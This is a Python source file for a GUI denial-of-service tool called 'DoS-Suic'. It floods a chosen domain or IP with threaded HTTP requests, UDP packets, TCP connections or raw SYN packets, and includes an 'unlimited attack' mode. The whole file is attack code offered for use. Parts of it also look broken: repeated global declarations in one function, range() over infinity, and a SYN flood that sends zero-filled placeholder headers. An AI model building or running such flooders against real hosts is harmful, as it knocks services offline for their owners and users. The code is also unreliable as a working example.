# *****************************************************************************
# *                                                                           *
# *   COPYRIGHT NOTICE                                                          *
# *   -------------------                                                        *
# *   This code is the intellectual property of Shikan-c. Unauthorized        *
# *   copying, modification, or distribution of this code is strictly         *
# *   prohibited. All rights reserved.                                         *
# *                                                                           *
# *   This software is provided "as is", without any warranty of any kind,    *
# *   express or implied, including but not limited to the warranties of      *
# *   merchantability, fitness for a particular purpose, or non-infringement.  *
# *   In no event shall the authors or copyright holders be liable for any    *
# *   claim, damages, or other liability, whether in an action of contract,    *
# *   tort, or otherwise, arising from, out of, or in connection with the     *
# *   software or the use or other dealings in the software.                   *
# *                                                                           *
# *****************************************************************************

import tkinter as tk
from tkinter import messagebox
import requests
import threading
import time
import socket
import sys
from urllib.parse import urlparse

# Global variables to control attack execution and threads
attack_running = True
attack_thread = None

def display_banner():
    """Display the banner text."""
    banner =  "██████╗ ██████╗  ██████╗ ███████╗       █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗\n"
    banner += "██╔══██╗██╔══██╗██╔═══██╗██╔════╝      ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║███████╗█████╗███████║   ██║      ██║   ███████║██║     █████╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║╚════██║╚════╝██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗\n"
    banner += "██████╔╝██████╔╝╚██████╔╝███████║      ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗\n"
    banner += "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\n\n"
    banner += "                       DoS-Suic\n"
    banner += "                   by Shikan-c\n"
    return banner

def create_gui():
    """Create the GUI for the DoS-Suic tool."""
    window = tk.Tk()
    window.title("DoS-Suic by Shikan-c")
    window.geometry("800x700")
    window.configure(bg="#2E2E2E")

    # Display the banner
    banner_text = display_banner()
    banner_label = tk.Label(window, text=banner_text, font=("Courier", 10), bg="#2E2E2E", fg="#FFFFFF", justify=tk.LEFT, anchor='w', padx=10, pady=10)
    banner_label.pack(fill=tk.X)

    title_label = tk.Label(window, text="DoS-Suic Attack Tool", font=("Helvetica", 22, "bold"), bg="#2E2E2E", fg="#FFFFFF")
    title_label.pack(pady=10)

    tk.Label(window, text="Target Domain (optional):", bg="#2E2E2E", fg="#FFFFFF").pack(pady=5)
    global url_entry
    url_entry = tk.Entry(window, width=70)
    url_entry.pack(pady=5)

    tk.Label(window, text="Target IP Address (optional):", bg="#2E2E2E", fg="#FFFFFF").pack(pady=5)
    global ip_entry
    ip_entry = tk.Entry(window, width=70)
    ip_entry.pack(pady=5)

    tk.Label(window, text="Number of Threads:", bg="#2E2E2E", fg="#FFFFFF").pack(pady=5)
    global threads_entry
    threads_entry = tk.Entry(window, width=70)
    threads_entry.pack(pady=5)

    tk.Label(window, text="Packet Limit:", bg="#2E2E2E", fg="#FFFFFF").pack(pady=5)
    global packet_limit_entry
    packet_limit_entry = tk.Entry(window, width=70)
    packet_limit_entry.pack(pady=5)

    global attack_type_var
    attack_type_var = tk.StringVar(value="HTTP")

    attack_types = ["HTTP", "UDP", "TCP", "SYN"]
    attack_type_menu = tk.OptionMenu(window, attack_type_var, *attack_types)
    attack_type_menu.config(bg="#4CAF50", fg="#FFFFFF", font=("Helvetica", 12))
    tk.Label(window, text="Select Attack Type:", bg="#2E2E2E", fg="#FFFFFF").pack(pady=5)
    attack_type_menu.pack(pady=5)

    tk.Button(window, text="Start Attack", command=start_attack, bg="#4CAF50", fg="#FFFFFF").pack(pady=10)
    tk.Button(window, text="Start Unlimited Attack", command=start_unlimited_attack, bg="#FFC107", fg="#FFFFFF").pack(pady=10)
    tk.Button(window, text="Stop Attack", command=stop_attack, bg="#F44336", fg="#FFFFFF").pack(pady=10)

    window.mainloop()

def is_valid_ip(ip):
    """Validate if the given IP address is valid."""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def is_valid_url(url):
    """Validate if the given URL is valid."""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def sanitize_ip(ip):
    """Sanitize IP address to prevent malicious inputs."""
    if is_valid_ip(ip):
        return ip
    else:
        return None

def sanitize_url(url):
    """Sanitize URL to prevent malicious inputs."""
    if is_valid_url(url):
        return url
    else:
        return None

def send_http_request(url, packet_limit):
    """Send HTTP requests to the target URL."""
    for _ in range(packet_limit):
        if not attack_running:
            print("Stopping HTTP attack as requested.")
            break
        try:
            response = requests.get(url)
            print(f"HTTP Request sent: {response.status_code}")
        except requests.RequestException as e:
            print(f"Error sending request: {e}")

def send_udp_packet(target_ip, target_port, packet_limit):
    """Send UDP packets to the target IP and port."""
    for _ in range(packet_limit):
        if not attack_running:
            print("Stopping UDP attack as requested.")
            break
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                message = b'UDP packet'
                sock.sendto(message, (target_ip, target_port))
                print(f"UDP Packet sent to {target_ip}:{target_port}")
        except socket.error as e:
            print(f"Error sending UDP packet: {e}")

def send_tcp_connection(target_ip, target_port, packet_limit):
    """Send TCP connections to the target IP and port."""
    for _ in range(packet_limit):
        if not attack_running:
            print("Stopping TCP attack as requested.")
            break
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((target_ip, target_port))
                print(f"TCP Connection established to {target_ip}:{target_port}")
        except socket.error as e:
            print(f"Error connecting via TCP: {e}")

def send_syn_flood(target_ip, target_port, packet_limit):
    """Send SYN flood packets to the target IP and port."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as sock:
            ip_header = b'\x00' * 20  # Placeholder IP header
            tcp_header = b'\x00' * 20  # Placeholder TCP header
            packet = ip_header + tcp_header
            count = 0
            while attack_running and count < packet_limit:
                sock.sendto(packet, (target_ip, target_port))
                print(f"SYN packet sent to {target_ip}:{target_port}")
                count += 1
                time.sleep(0.1)  # Adjust sleep time as needed
    except socket.error as e:
        print(f"Error sending SYN flood packets: {e}")

def attack_target_http(url, thread_count, packet_limit):
    """Start HTTP attack on the target URL with specified threads and packet limit."""
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_http_request, args=(url, packet_limit))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

def attack_target_udp(ip, port, thread_count, packet_limit):
    """Start UDP attack on the target IP and port with specified threads and packet limit."""
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_udp_packet, args=(ip, port, packet_limit))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

def attack_target_tcp(ip, port, thread_count, packet_limit):
    """Start TCP attack on the target IP and port with specified threads and packet limit."""
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_tcp_connection, args=(ip, port, packet_limit))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

def attack_target_syn(ip, port, thread_count, packet_limit):
    """Start SYN flood attack on the target IP and port with specified threads and packet limit."""
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_syn_flood, args=(ip, port, packet_limit))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

def start_attack():
    """Start the attack based on user input."""
    global attack_running
    attack_running = True
    
    url = url_entry.get().strip()
    ip = ip_entry.get().strip()
    threads = threads_entry.get().strip()
    packet_limit = packet_limit_entry.get().strip()
    attack_type = attack_type_var.get()
    
    if not threads.isdigit() or not packet_limit.isdigit():
        messagebox.showerror("Invalid Input", "Number of threads and packet limit must be integers.")
        return

    thread_count = int(threads)
    packet_limit = int(packet_limit)

    if attack_type == "HTTP":
        if not url:
            messagebox.showerror("Invalid Input", "URL must be provided for HTTP attack.")
            return
        sanitized_url = sanitize_url(url)
        if not sanitized_url:
            messagebox.showerror("Invalid URL", "The provided URL is not valid.")
            return
        global attack_thread
        attack_thread = threading.Thread(target=attack_target_http, args=(sanitized_url, thread_count, packet_limit))
        attack_thread.start()
    
    elif attack_type == "UDP":
        if not ip:
            messagebox.showerror("Invalid Input", "IP Address must be provided for UDP attack.")
            return
        if not is_valid_ip(ip):
            messagebox.showerror("Invalid IP", "The provided IP address is not valid.")
            return
        target_port = 80  # Default port for UDP
        global attack_thread
        attack_thread = threading.Thread(target=attack_target_udp, args=(ip, target_port, thread_count, packet_limit))
        attack_thread.start()
    
    elif attack_type == "TCP":
        if not ip:
            messagebox.showerror("Invalid Input", "IP Address must be provided for TCP attack.")
            return
        if not is_valid_ip(ip):
            messagebox.showerror("Invalid IP", "The provided IP address is not valid.")
            return
        target_port = 80  # Default port for TCP
        global attack_thread
        attack_thread = threading.Thread(target=attack_target_tcp, args=(ip, target_port, thread_count, packet_limit))
        attack_thread.start()
    
    elif attack_type == "SYN":
        if not ip:
            messagebox.showerror("Invalid Input", "IP Address must be provided for SYN flood attack.")
            return
        if not is_valid_ip(ip):
            messagebox.showerror("Invalid IP", "The provided IP address is not valid.")
            return
        target_port = 80  # Default port for SYN flood
        global attack_thread
        attack_thread = threading.Thread(target=attack_target_syn, args=(ip, target_port, thread_count, packet_limit))
        attack_thread.start()

def start_unlimited_attack():
    """Start the unlimited attack based on user input."""
    global attack_running
    attack_running = True
    
    url = url_entry.get().strip()
    ip = ip_entry.get().strip()
    attack_type = attack_type_var.get()
    
    if attack_type == "HTTP":
        if not url:
            messagebox.showerror("Invalid Input", "URL must be provided for HTTP attack.")
            return
        sanitized_url = sanitize_url(url)
        if not sanitized_url:
            messagebox.showerror("Invalid URL", "The provided URL is not valid.")
            return
        global attack_thread
        attack_thread = threading.Thread(target=lambda: send_http_request(sanitized_url, float('inf')))
        attack_thread.start()
    
    elif attack_type == "UDP":
        if not ip:
            messagebox.showerror("Invalid Input", "IP Address must be provided for UDP attack.")
            return
        if not is_valid_ip(ip):
            messagebox.showerror("Invalid IP", "The provided IP address is not valid.")
            return
        target_port = 80  # Default port for UDP
        global attack_thread
        attack_thread = threading.Thread(target=lambda: send_udp_packet(ip, target_port, float('inf')))
        attack_thread.start()
    
    elif attack_type == "TCP":
        if not ip:
            messagebox.showerror("Invalid Input", "IP Address must be provided for TCP attack.")
            return
        if not is_valid_ip(ip):
            messagebox.showerror("Invalid IP", "The provided IP address is not valid.")
            return
        target_port = 80  # Default port for TCP
        global attack_thread
        attack_thread = threading.Thread(target=lambda: send_tcp_connection(ip, target_port, float('inf')))
        attack_thread.start()
    
    elif attack_type == "SYN":
        if not ip:
            messagebox.showerror("Invalid Input", "IP Address must be provided for SYN flood attack.")
            return
        if not is_valid_ip(ip):
            messagebox.showerror("Invalid IP", "The provided IP address is not valid.")
            return
        target_port = 80  # Default port for SYN flood
        global attack_thread
        attack_thread = threading.Thread(target=lambda: send_syn_flood(ip, target_port, float('inf')))
        attack_thread.start()

def stop_attack():
    """Stop the ongoing attack."""
    global attack_running
    attack_running = False
    if attack_thread and attack_thread.is_alive():
        attack_thread.join()
    print("Attack has been stopped.")

if __name__ == "__main__":
    create_gui()
